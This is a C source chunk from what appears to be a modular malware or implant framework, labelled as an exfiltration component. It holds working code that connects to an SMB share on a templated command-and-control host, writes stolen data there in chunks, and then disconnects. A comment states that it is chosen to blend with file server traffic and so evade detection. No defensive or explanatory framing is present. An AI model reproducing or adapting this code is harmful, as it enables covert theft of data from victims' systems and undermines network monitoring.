// chunk: exfil/smb_write
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h, windows.h, winnetwk.h
// libs: ws2_32, mpr
// note: Write data to SMB share — blends with file server traffic

#ifndef CHUNK_SMB_WRITE
#define CHUNK_SMB_WRITE

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winnetwk.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    (void)port;
    char unc_path[256];
    snprintf(unc_path, sizeof(unc_path), "\\\\%s\\share", ip);

    NETRESOURCEA nr;
    ZeroMemory(&nr, sizeof(nr));
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpRemoteName = unc_path;

    DWORD ret = WNetAddConnection2A(&nr, NULL, NULL, CONNECT_TEMPORARY);
    if (ret != NO_ERROR && ret != ERROR_ALREADY_ASSIGNED) return FALSE;

    char filename[64];
    DWORD tick = GetTickCount();
    snprintf(filename, sizeof(filename), "data_%08x.bin", tick);

    char filepath[320];
    snprintf(filepath, sizeof(filepath), "%s\\%s", unc_path, filename);

    HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WNetCancelConnection2A(unc_path, 0, TRUE);
        return FALSE;
    }

    DWORD written = 0;
    DWORD offset = 0;
    BOOL ok = TRUE;
    while (offset < len) {
        DWORD chunk = (len - offset > 65536) ? 65536 : (len - offset);
        if (!WriteFile(hFile, data + offset, chunk, &written, NULL)) {
            ok = FALSE;
            break;
        }
        offset += written;
    }

    CloseHandle(hFile);
    WNetCancelConnection2A(unc_path, 0, TRUE);
    return ok;
}

#endif
